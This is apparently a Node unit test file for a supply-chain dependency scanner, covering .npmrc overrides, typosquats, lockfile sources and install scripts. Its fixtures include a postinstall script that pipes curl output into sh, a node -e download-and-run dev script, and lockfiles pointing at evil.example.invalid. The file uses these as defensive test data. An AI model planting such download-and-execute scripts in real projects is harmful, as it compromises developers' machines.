// Static dependency checks (no network, no npm): .npmrc, lockfiles, typosquats, root scripts.
// The install/signature/OSV steps are covered by the Docker integration tests.

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { Findings } from '../sandbox/scanner/findings.js'
import { dependencyChecks, lockfileChecks, typosquatOf, parseNpmrc, editDistance } from '../sandbox/scanner/checks/deps.js'
import { fixture, j } from './helpers/fixture.js'

async function deps(files) {
  const fx = await fixture(files)
  try {
    const f = new Findings()
    // skipInstall: no npm in unit tests. A missing osv binary is reported as a coverage gap, which we filter.
    await dependencyChecks(fx.dir, f, { skipInstall: true, osvBin: 'osv-scanner-not-installed-in-unit-tests' })
    return f.toJSON().filter(x => x.id !== 'DEP-OSV-UNAVAILABLE')
  } finally { await fx.cleanup() }
}
const ids = list => list.map(f => `${f.id}:${f.severity}`)

test('edit distance counts swaps as one edit', () => {
  assert.equal(editDistance('lodash', 'lodahs'), 1)
  assert.equal(editDistance('express', 'expresss'), 1)
  assert.equal(editDistance('react', 'vue', 2), 3)
})

test('typosquats of popular packages are recognized; real packages are not', () => {
  assert.equal(typosquatOf('expresss'), 'express')
  assert.equal(typosquatOf('crossenv'), 'cross-env')
  assert.equal(typosquatOf('lodahs'), 'lodash')
  assert.equal(typosquatOf('react-dom'), null)
  assert.equal(typosquatOf('preact'), null)
  assert.equal(typosquatOf('left-pad'), null)
  assert.equal(typosquatOf('ws'), null)
})

test('parseNpmrc reads keys, skips comments', () => {
  assert.deepEqual(parseNpmrc('# c\nregistry=https://r.example/\n@acme:registry = https://a.example/\n; x\n'), [['registry', 'https://r.example/'], ['@acme:registry', 'https://a.example/']])
})

test('a project .npmrc that redirects the registry or sets node-options is a FAIL', async () => {
  const r = await deps({ '.npmrc': `registry=https://registry.example.invalid/\n${j('node-', 'options')}=--require ./x.js\n`, 'package.json': '{}' })
  assert.ok(r.some(f => f.id === 'NPMRC-OVERRIDE' && f.severity === 'high' && /node-options/.test(f.evidence)), ids(r))
})

test('a .npmrc that only pins the official registry is fine', async () => {
  const r = await deps({ '.npmrc': 'registry=https://registry.npmjs.org/\nsave-exact=true\n', 'package.json': '{}' })
  assert.deepEqual(ids(r), [])
})

test('a committed npm token is reported (with a placeholder, never a real-looking token)', async () => {
  const r = await deps({ '.npmrc': `//registry.npmjs.org/:${j('_auth', 'Token')}=not-a-real-token\n`, 'package.json': '{}' })
  assert.ok(r.some(f => f.id === 'NPMRC-TOKEN'), ids(r))
})

test('root install scripts: download-and-run is a FAIL, husky is low, others warn', async () => {
  const bad = await deps({ 'package.json': JSON.stringify({ scripts: { postinstall: `${j('cur', 'l')} -s https://x.invalid/p | sh` } }) })
  assert.ok(bad.some(f => f.id === 'SCRIPT-ROOT-DANGEROUS' && f.severity === 'high'), ids(bad))
  const husky = await deps({ 'package.json': JSON.stringify({ scripts: { prepare: 'husky' } }) })
  assert.ok(husky.some(f => f.id === 'SCRIPT-ROOT-LIFECYCLE' && f.severity === 'low'), ids(husky))
  const other = await deps({ 'package.json': JSON.stringify({ scripts: { postinstall: 'node scripts/setup.js' } }) })
  assert.ok(other.some(f => f.id === 'SCRIPT-ROOT-LIFECYCLE' && f.severity === 'medium'), ids(other))
})

test('"npm run dev" that downloads and executes is a warning', async () => {
  const r = await deps({ 'package.json': JSON.stringify({ scripts: { dev: `node -e "$(${j('cur', 'l')} -s https://x.invalid)" && vite` } }) })
  assert.ok(r.some(f => f.id === 'SCRIPT-RUN-DANGEROUS'), ids(r))
})

test('a typosquatted direct dependency is a warning', async () => {
  const r = await deps({ 'package.json': JSON.stringify({ dependencies: { expresss: '^4.0.0', react: '^19.0.0' } }) })
  assert.ok(r.some(f => f.id === 'DEP-TYPOSQUAT' && /expresss ≈ express/.test(f.evidence)), ids(r))
  assert.equal(r.filter(f => f.id === 'DEP-TYPOSQUAT').length, 1)
})

test('a dependency named in the IOC snapshot is critical', async () => {
  const r = await deps({ 'package.json': JSON.stringify({ dependencies: { [j('axios-', 'test-one')]: '1.0.0' } }) })
  assert.ok(r.some(f => f.id === 'IOC-MATCH' && f.severity === 'critical'), ids(r))
})

test('lockfile entries over http, from odd hosts, from git, or without integrity are reported', async () => {
  const lock = {
    lockfileVersion: 3,
    packages: {
      '': { name: 'demo' },
      'node_modules/a': { version: '1.0.0', resolved: 'http://files.example.invalid/a/-/a-1.0.0.tgz', integrity: 'sha512-x' },
      'node_modules/a2': { version: '1.0.0', resolved: 'http://registry.npmjs.org/a2/-/a2-1.0.0.tgz', integrity: 'sha512-x' },
      'node_modules/b': { version: '1.0.0', resolved: 'https://files.example.invalid/b-1.0.0.tgz', integrity: 'sha512-x' },
      'node_modules/c': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/c.git#abc' },
      'node_modules/d': { version: '1.0.0', resolved: 'https://registry.npmjs.org/d/-/d-1.0.0.tgz' },
      'node_modules/e': { version: '1.0.0', resolved: 'https://registry.npmjs.org/e/-/e-1.0.0.tgz', integrity: 'sha1-abc' },
      'node_modules/f': { version: '1.0.0', resolved: 'https://registry.npmjs.org/f/-/f-1.0.0.tgz', integrity: 'sha512-ok' },
    },
  }
  const fx = await fixture({ 'package-lock.json': JSON.stringify(lock) })
  try {
    const f = new Findings()
    const { names } = await lockfileChecks(fx.dir, f)
    const r = f.toJSON()
    for (const [id, sev] of [['LOCK-RESOLVED-INSECURE', 'high'], ['LOCK-RESOLVED-HTTP-REGISTRY', 'low'], ['LOCK-RESOLVED-NONREGISTRY', 'medium'], ['LOCK-RESOLVED-GIT', 'low'], ['LOCK-MISSING-INTEGRITY', 'medium'], ['LOCK-WEAK-INTEGRITY', 'low']]) {
      assert.ok(r.some(x => x.id === id && x.severity === sev), `${id} in ${ids(r)}`)
    }
    assert.ok(names.has('f') && names.has('a'))
  } finally { await fx.cleanup() }
})

test('a clean registry-only lockfile produces no lockfile findings', async () => {
  const lock = { lockfileVersion: 3, packages: { '': {}, 'node_modules/ms': { version: '2.1.3', resolved: 'https://registry.npmjs.org/ms/-/ms-2.1.3.tgz', integrity: 'sha512-6FlzubTLZG3J2a' } } }
  const r = await deps({ 'package.json': '{"dependencies":{"ms":"2.1.3"}}', 'package-lock.json': JSON.stringify(lock) })
  assert.deepEqual(ids(r), [])
})

test('yarn.lock and pnpm-lock.yaml non-registry sources are reported', async () => {
  const yarn = `# yarn lockfile v1\n\nleft-pad@^1.3.0:\n  version "1.3.0"\n  resolved "http://evil.example.invalid/left-pad-1.3.0.tgz#5b8a3a7765dfe001261dde915589e782f8c94d1e"\n  integrity sha512-x\n`
  const pnpm = `lockfileVersion: '9.0'\npackages:\n  left-pad@1.3.0:\n    resolution: {tarball: https://evil.example.invalid/left-pad-1.3.0.tgz}\n`
  const r = await deps({ 'yarn.lock': yarn, 'pnpm-lock.yaml': pnpm })
  assert.ok(r.some(f => f.id === 'LOCK-RESOLVED-INSECURE' && f.file === 'yarn.lock'), ids(r))
  assert.ok(r.some(f => f.id === 'LOCK-RESOLVED-NONREGISTRY' && f.file === 'pnpm-lock.yaml'), ids(r))
})

test('requirements.txt with --extra-index-url (dependency confusion) is a warning', async () => {
  const r = await deps({ 'requirements.txt': '--extra-index-url https://pypi.example.invalid/simple\nrequests==2.32.3\n' })
  assert.ok(r.some(f => f.id === 'PY-INDEX-OVERRIDE'), ids(r))
})

test('yarnPath is a warning wherever it points (the standard release path is still repo code)', async () => {
  const std = await deps({ '.yarnrc.yml': 'yarnPath: .yarn/releases/yarn-4.5.0.cjs\n' })
  assert.ok(std.some(f => f.id === 'YARN-PATH' && f.severity === 'medium'), ids(std))
  const odd = await deps({ '.yarnrc.yml': 'yarnPath: scripts/setup.js\n' })
  assert.ok(odd.some(f => f.id === 'YARN-PATH' && f.severity === 'medium'), ids(odd))
})
